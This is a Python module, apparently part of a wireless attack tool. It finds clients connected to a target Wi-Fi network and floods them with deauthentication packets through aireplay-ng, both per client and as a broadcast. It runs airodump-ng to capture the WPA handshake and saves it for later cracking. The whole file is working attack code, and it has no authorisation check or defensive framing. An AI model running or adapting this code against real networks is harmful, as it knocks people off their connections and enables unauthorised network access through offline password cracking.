import os
import sys
import time
import signal
import subprocess
import threading
import shutil
from datetime import datetime
from utils import colored_log, execute_command, sanitize_ssid, check_handshake
from scanner import detect_connected_clients
from rich.console import Console
from rich.panel import Panel
from rich.table import Table

console = Console()


def capture_handshake(self, network) -> str | None:
    """Capture handshake from target network - original fast logic with Rich display"""
    if not self.monitor_interface:
        colored_log("error", "No monitor mode interface found!")
        return None

    clients = detect_connected_clients(self, network, duration=15)
    if not clients:
        colored_log("error", f"No connected clients detected for {network.essid}.")
        return None

    client_table = Table(show_header=True, header_style="bold cyan", box=None)
    client_table.add_column("#", style="bold", width=3)
    client_table.add_column("Client MAC", style="green")
    
    for idx, client in enumerate(clients, 1):
        client_table.add_row(str(idx), client)
    
    console.print(Panel(
        client_table,
        title=f"[bold green]✓ {len(clients)} Client(s) Detected[/bold green]",
        border_style="green"
    ))

    deauthenticate_clients(self, network, clients)

    safe_essid = sanitize_ssid(network.essid)
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    capture_name = f"{safe_essid}_{timestamp}"
    capture_path = os.path.join(self.temp_dir, capture_name)

    colored_log("info", f"Starting handshake capture for {network.essid}...")

    capture_cmd = [
        "airodump-ng",
        "--bssid",
        network.bssid,
        "--channel",
        str(network.channel),
        "--write",
        capture_path,
        self.monitor_interface,
    ]

    try:
        capture_proc = subprocess.Popen(
            capture_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except FileNotFoundError:
        colored_log(
            "error", "airodump-ng not found. Make sure aircrack-ng suite is installed."
        )
        return None

    cap_file = f"{capture_path}-01.cap"
    timeout = 60
    start_time = time.time()
    
    console.print(f"\n[bold cyan]📡 Capturing handshake for {network.essid}...[/bold cyan]")
    
    try:
        while True:
            elapsed_time = int(time.time() - start_time)
            remaining_time = max(0, timeout - elapsed_time)
            
            progress = int((elapsed_time / timeout) * 30)
            bar = f"[{'█' * progress}{'░' * (30 - progress)}]"
            
            console.print(
                f"[cyan]⏱  {elapsed_time}s / {timeout}s {bar}[/cyan]",
                end="\r"
            )

            if os.path.exists(cap_file) and check_handshake(cap_file):
                console.print(" " * 80, end="\r")
                console.print("[bold green]✓ Handshake detected![/bold green]")
                break

            if elapsed_time >= timeout:
                console.print(" " * 80, end="\r")
                colored_log("warning", "Handshake capture timed out after 1 minute!")
                break
            time.sleep(1)
    except KeyboardInterrupt:
        console.print(" " * 80, end="\r")
        colored_log("warning", "Capture cancelled by user!")
    finally:
        capture_proc.send_signal(signal.SIGTERM)
        capture_proc.wait()

    if not os.path.exists(cap_file) or not check_handshake(cap_file):
        colored_log("error", "Failed to capture handshake after deauthentication!")
        return None

    final_path = os.path.join(self.handshake_dir, f"{safe_essid}.cap")
    shutil.copy(cap_file, final_path)
    colored_log("success", f"Handshake saved to {final_path}")
    return final_path


def deauthenticate_clients(self, network, clients: list[str]):
    """Deauthenticate all connected clients using multithreading with improved effectiveness"""
    colored_log(
        "info",
        f"Starting deauthentication for {len(clients)} clients on {network.essid}...",
    )

    def deauth_client(client: str):
        deauth_cmd = [
            "aireplay-ng",
            "--deauth",
            "10",
            "-a",
            network.bssid,
            "-c",
            client,
            self.monitor_interface,
        ]
        try:
            subprocess.Popen(
                deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
        except FileNotFoundError:
            colored_log(
                "error",
                "aireplay-ng not found. Make sure aircrack-ng suite is installed.",
            )

    threads = []
    for idx, client in enumerate(clients):
        colored_log(
            "info", f"[{idx + 1}/{len(clients)}] Sending deauth to client {client}"
        )
        thread = threading.Thread(target=deauth_client, args=(client,))
        thread.daemon = True
        thread.start()
        threads.append(thread)
        time.sleep(0.1)

    time.sleep(1)

    broadcast_deauth_cmd = [
        "aireplay-ng",
        "--deauth",
        "10",
        "-a",
        network.bssid,
        self.monitor_interface,
    ]
    colored_log("info", "Sending additional broadcast deauthentication...")
    try:
        subprocess.Popen(
            broadcast_deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except FileNotFoundError:
        colored_log(
            "error", "aireplay-ng not found. Make sure aircrack-ng suite is installed."
        )

    time.sleep(3)

    colored_log(
        "success", "Deauthentication process initiated for all connected clients!"
    )
